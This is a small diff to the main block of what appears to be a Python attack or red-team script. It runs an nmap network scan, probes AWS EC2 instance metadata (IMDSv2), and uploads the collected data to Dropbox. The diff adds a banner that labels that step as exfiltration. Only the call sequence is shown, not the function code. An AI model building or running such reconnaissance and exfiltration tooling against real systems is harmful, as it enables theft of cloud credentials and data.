@@ -356,4 +356,5 @@ if __name__ == "__main__":
     scan_network_with_nmap(LOCAL_DOWNLOAD_DIR)
     print(f"\n#################### Probing IMDSv2 and EC2 context ##################### \n")
     probe_imdsv2(LOCAL_DOWNLOAD_DIR)
+    print(f"\n#################### Exfiltrating collected data to DropBox ##################### \n")
     upload_to_dropbox(LOCAL_DOWNLOAD_DIR)
